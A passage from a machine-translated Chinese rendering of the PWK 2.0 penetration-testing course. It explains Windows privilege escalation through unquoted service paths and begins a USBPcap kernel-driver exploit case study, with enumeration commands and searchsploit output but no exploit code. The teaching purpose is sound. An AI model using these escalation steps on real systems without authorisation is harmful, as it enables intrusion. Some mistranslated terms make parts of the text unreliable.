<div style="position:absolute;top:140039;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\程序.exe</font></font></nobr></div>
<div style="position:absolute;top:140056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files\My.exe</font></font></nobr></div>
<div style="position:absolute;top:140073;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files\My Program\My.exe</font></font></nobr></div>
<div style="position:absolute;top:140090;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files\My Program\My service\service.exe</font></font></nobr></div>
<div style="position:absolute;top:140109;left:186"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 574 - Windows 如何尝试定位未加引号的服务的正确路径的示例</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，Windows 将搜索每个“解释的位置”以试图找到一个有效的</font></font></nobr></div>
<div style="position:absolute;top:140158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可执行路径。</font><font style="vertical-align: inherit;">为了利用这一点并颠覆原始的未引用服务调用，我们必须</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:140211;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">533 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（安德鲁·弗里伯恩，2016 年），https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability</font></font></font></nobr></div>
<div style="position:absolute;top:140231;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">534 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://support.microsoft.com/en-us/help/102739/long-filenames-or-paths-with-spaces-require-quotation-marks</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:140359;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="119"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 119 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:140392;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:141469;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:141469;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:141469;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">560</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140488;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建一个恶意可执行文件，将其放置在与解释的其中之一相对应的目录中</font></font></nobr></div>
<div style="position:absolute;top:140507;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">路径，并命名它以便它也匹配解释的文件名。</font><font style="vertical-align: inherit;">然后，当服务运行时，它</font></font></nobr></div>
<div style="position:absolute;top:140526;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应该使用与服务启动相同的权限来执行我们的文件。</font><font style="vertical-align: inherit;">通常，这恰好是</font></font></nobr></div>
<div style="position:absolute;top:140546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT\SYSTEM 帐户，这会导致成功的提权攻击。</font></font></nobr></div>
<div style="position:absolute;top:140579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以将我们的可执行文件 Program.exe 命名为 C:\，或者将其命名为 My.exe 并</font></font></nobr></div>
<div style="position:absolute;top:140598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将它放在 C:\Program Files 中。</font><font style="vertical-align: inherit;">但是，这将需要一些不太可能的写权限，因为</font></font></nobr></div>
<div style="position:absolute;top:140617;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认情况下，标准用户对这些目录没有写访问权限。</font></font></nobr></div>
<div style="position:absolute;top:140650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更有可能是软件的主目录（在我们的示例中为 C:\Program Files\My Program）</font></font></nobr></div>
<div style="position:absolute;top:140669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或子目录（C:\Program Files\My Program\My service）配置错误，允许我们种植</font></font></nobr></div>
<div style="position:absolute;top:140689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恶意的 My.exe 二进制文件。</font></font></nobr></div>
<div style="position:absolute;top:140721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尽管此漏洞需要特定的组合要求，但很容易被利用</font></font></nobr></div>
<div style="position:absolute;top:140741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及值得考虑的特权提升攻击向量。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:140775;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">18.2.6</font></font></i></nobr></div>
<div style="position:absolute;top:140775;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows 内核漏洞：USBPcap 案例研究</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:140813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在前面的 fodhelper.exe 示例中，我们利用了一个基于应用程序的漏洞绕过</font></font></nobr></div>
<div style="position:absolute;top:140833;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通用汽车公司。</font><font style="vertical-align: inherit;">在本节中，我们将演示依赖于内核驱动程序的提权</font></font></nobr></div>
<div style="position:absolute;top:140852;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脆弱性。</font><font style="vertical-align: inherit;">再一次，模块的这一部分将无法在您的专用</font></font></nobr></div>
<div style="position:absolute;top:140872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">客户端，但您将能够对实验室环境中的各种主机使用此技术。</font></font></nobr></div>
<div style="position:absolute;top:140904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当试图利用系统级软件（例如驱动程序或内核本身）时，我们必须付出代价</font></font></nobr></div>
<div style="position:absolute;top:140923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仔细注意几个因素，包括目标的操作系统、版本和</font></font></nobr></div>
<div style="position:absolute;top:140943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建筑学。</font><font style="vertical-align: inherit;">未能准确识别这些因素可能会触发蓝屏死机</font></font></nobr></div>
<div style="position:absolute;top:140962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(BSOD) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">535</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行漏洞。</font><font style="vertical-align: inherit;">这会对客户的生产系统和</font></font></nobr></div>
<div style="position:absolute;top:140982;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拒绝我们访问潜在有价值的目标。</font></font></nobr></div>
<div style="position:absolute;top:141014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">考虑到我们必须采取的谨慎程度，在以下示例中，我们将首先确定</font></font></nobr></div>
<div style="position:absolute;top:141034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标操作系统的版本和架构。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统信息 | </font><font style="vertical-align: inherit;">findstr /B /C:"操作系统名称" /C:"操作系统版本" /C:"系统类型"</font></font></font></b></nobr></div>
<div style="position:absolute;top:141085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统名称：    </font></font></nobr></div>
<div style="position:absolute;top:141085;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">视窗 7</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">专业版</font></font></nobr></div>
<div style="position:absolute;top:141102;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作系统版本：    </font></font></nobr></div>
<div style="position:absolute;top:141102;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6.1.7601</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务包 1</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内部版本 7601</font></font></nobr></div>
<div style="position:absolute;top:141120;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统类型：    </font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:141120;left:328"><nobr><b><font style="vertical-align: inherit;"></font></b><font style="vertical-align: inherit;"><font color="#000000"><font style="vertical-align: inherit;">基于</font></font><b><font style="vertical-align: inherit;">X86</font></b></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的 PC</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141139;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 575 - 检查目标的版本和架构</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:141169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令的输出显示我们的目标在 x86 处理器上运行 Windows 7 SP1。</font></font></nobr></div>
<div style="position:absolute;top:141201;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，我们可以尝试定位 Windows 7 SP1 x86 和</font></font></nobr></div>
<div style="position:absolute;top:141220;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用它来提升我们的特权。</font><font style="vertical-align: inherit;">但是，第三方驱动程序漏洞利用更为常见。</font><font style="vertical-align: inherit;">如此，我们</font></font></nobr></div>
<div style="position:absolute;top:141240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">应始终尝试首先调查此攻击面，然后再求助于更困难的</font></font></nobr></div>
<div style="position:absolute;top:141259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击。</font></font></nobr></div>
<div style="position:absolute;top:141292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们将首先枚举系统上安装的驱动程序：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141327;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\student\Desktop </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&gt;driverquery /v</font></font></font></b></nobr></div>
<div style="position:absolute;top:141361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块名称 显示名称    </font></font></nobr></div>
<div style="position:absolute;top:141361;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述    </font></font></nobr></div>
<div style="position:absolute;top:141361;left:587"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动器类型 Start M</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:141419;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">535 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Blue_Screen_of_Death</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:141547;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="120"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 120 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:141580;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:142657;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:142657;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:142657;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">561</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ode 状态 状态 Accept Stop Accept Pause Paged Pool Code(bytes BSS(by</font></font></nobr></div>
<div style="position:absolute;top:141692;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">链接日期    </font></font></nobr></div>
<div style="position:absolute;top:141692;left:295"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">小路    </font></font></nobr></div>
<div style="position:absolute;top:141692;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">初始化（字节</font></font></nobr></div>
<div style="position:absolute;top:141709;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">es</font></font></nobr></div>
<div style="position:absolute;top:141726;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ==========================</font></font></nobr></div>
<div style="position:absolute;top:141744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">=== ========== ====================================== ======================</font></font></nobr></div>
<div style="position:absolute;top:141760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================================================== ============================</font></font></nobr></div>
<div style="position:absolute;top:141777;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==</font></font></nobr></div>
<div style="position:absolute;top:141811;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ACPI    </font></font></nobr></div>
<div style="position:absolute;top:141811;left:214"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft ACPI 驱动程序 Microsoft ACPI 驱动程序内核    </font></font></nobr></div>
<div style="position:absolute;top:141811;left:700"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开机</font></font></nobr></div>
<div style="position:absolute;top:141828;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行正常    </font></font></nobr></div>
<div style="position:absolute;top:141828;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">真的    </font></font></nobr></div>
<div style="position:absolute;top:141828;left:417"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的    </font></font></nobr></div>
<div style="position:absolute;top:141828;left:522"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">77,824 143,360 0</font></font></nobr></div>
<div style="position:absolute;top:141845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11/20/2010 12:37:52 AM C:\Windows\system32\drivers\ACPI.sys    </font></font></nobr></div>
<div style="position:absolute;top:141845;left:692"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8,192</font></font></nobr></div>
<div style="position:absolute;top:141879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:141913;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USBPcap USBPcap 采集服务 USBPcap 采集服务内核    </font></font></b></nobr></div>
<div style="position:absolute;top:141913;left:700"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手动的</font></font></b></nobr></div>
<div style="position:absolute;top:141930;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">停止正常    </font></font></b></nobr></div>
<div style="position:absolute;top:141930;left:319"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">假假    </font></font></b></nobr></div>
<div style="position:absolute;top:141930;left:522"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7,040 9,600 0</font></font></b></nobr></div>
<div style="position:absolute;top:141947;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10/2/2015 2:08:15 AM C:\Windows\system32\DRIVERS\USBPcap.sys    </font></font></b></nobr></div>
<div style="position:absolute;top:141947;left:692"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2,176</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:141981;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:142000;left:348"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 576 - 列出所有已安装的驱动程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:142030;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出主要包括典型的 Microsoft 安装的驱动程序和数量非常有限的</font></font></nobr></div>
<div style="position:absolute;top:142049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USBPcap 等第三方驱动程序。</font><font style="vertical-align: inherit;">需要注意的是，即使这个驱动程序被标记</font></font></nobr></div>
<div style="position:absolute;top:142069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">停止后，我们可能仍然能够与它交互，因为它仍然加载在内核内存空间中。</font></font></nobr></div>
<div style="position:absolute;top:142101;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于微软安装的驱动程序有一个相当严格的补丁周期，第三方驱动程序经常出现</font></font></nobr></div>
<div style="position:absolute;top:142121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更诱人的攻击面。</font><font style="vertical-align: inherit;">例如，让我们在漏洞利用数据库中搜索 USBPcap：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:142155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~# </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit USBPcap</font></font></font></b></nobr></div>
<div style="position:absolute;top:142172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------- ----------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:142189;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题    </font></font></nobr></div>
<div style="position:absolute;top:142189;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">小路</font></font></nobr></div>
<div style="position:absolute;top:142207;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">(/usr/share/exploitdb/)</font></font></nobr></div>
<div style="position:absolute;top:142223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------- ----------- -----------------------------</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:142240;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USBPcap 1.1.0.0 (WireShark 2.2.5) </font></font></b><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- Lo | </font><font style="vertical-align: inherit;">漏洞利用/windows/local/41542.c</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:142257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------- ----------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:142276;left:303"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 577 - “USBPcap”搜索的 searchsploit 输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:142306;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出报告有一个可用于 USBPcap 的漏洞利用。</font><font style="vertical-align: inherit;">如清单 578 所示，这个</font></font></nobr></div>
<div style="position:absolute;top:142325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特定漏洞</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">536</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对我们的操作系统版本、补丁级别和架构。</font><font style="vertical-align: inherit;">然而，它</font></font></nobr></div>
<div style="position:absolute;top:142345;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">取决于特定版本的驱动程序，即 USBPcap 版本 1.1.0.0，已安装</font></font></nobr></div>
<div style="position:absolute;top:142364;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及 Wireshark 2.2.5。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:142399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题 - USBPcap 空指针取消引用权限提升</font></font></nobr></div>
<div style="position:absolute;top:142416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">日期    </font></font></nobr></div>
<div style="position:absolute;top:142416;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 2017 年 3 月 7 日</font></font></nobr></div>
<div style="position:absolute;top:142433;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发现者 - Parvez Anwar (@parvezghh)</font></font></nobr></div>
<div style="position:absolute;top:142450;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">供应商主页 - http://desowin.org/usbpcap/ </font></font></nobr></div>
<div style="position:absolute;top:142467;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">测试版本 - </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.1.0.0（与 WireShark 2.2.5 捆绑的 Windows 的 USB 数据包上限）</font></font></font></b></nobr></div>
<div style="position:absolute;top:142484;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动程序版本 - 1.1.0.0 - USBPcap.sys</font></font></nobr></div>
<div style="position:absolute;top:142501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在操作系统上测试 - </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">32 位 Windows 7 SP1</font></font></font></b></nobr></div>
<div style="position:absolute;top:142518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CVE ID    </font></font></nobr></div>
<div style="position:absolute;top:142518;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- CVE-2017-6178</font></font></nobr></div>
<div style="position:absolute;top:142535;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">供应商修复网址 - 还没有</font></font></nobr></div>
<div style="position:absolute;top:142552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">固定版本 - 0day</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:142607;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">536 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Parvez Anwar，2017 年），https://www.exploit-db.com/exploits/41542/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:142735;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="121"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 121 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:142768;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:143845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:143845;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:143845;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">562</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:142864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">固定驱动程序版本 - 0day</font></font></nobr></div>
<div style="position:absolute;top:142880;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:142900;left:340"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 578 - USBPcap 漏洞利用信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:142930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们看一下我们的目标系统，看看是否安装了该特定版本的驱动程序。</font></font></nobr></div>
<div style="position:absolute;top:142962;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将列出 Program Files 目录的内容，以搜索 USBPcap 目录：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:142997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\n00b&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd "C:\Program Files"</font></font></font></b></nobr></div>
<div style="position:absolute;top:143031;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Program Files&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录</font></font></font></b></nobr></div>
<div style="position:absolute;top:143048;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:143065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">08/13/2015 04:04 PM &lt;DIR&gt;    </font></font></nobr></div>
<div style="position:absolute;top:143065;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MSBuild</font></font></nobr></div>
<div style="position:absolute;top:143082;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">07/14/2009 06:52 AM &lt;目录&gt;    </font></font></nobr></div>
<div style="position:absolute;top:143082;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考组件</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:143099;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01/24/2018 02:30 AM &lt;DIR&gt;    </font></font></b></nobr></div>
<div style="position:absolute;top:143099;left:425"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USB电容</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:143116;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">12/22/2017 04:11 PM &lt;目录&gt;    </font></font></nobr></div>
<div style="position:absolute;top:143116;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虚拟机</font></font></nobr></div>
<div style="position:absolute;top:143133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">04/12/2011 04:16 AM &lt;目录&gt;    </font></font></nobr></div>
<div style="position:absolute;top:143133;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Defender的</font></font></nobr></div>
<div style="position:absolute;top:143150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
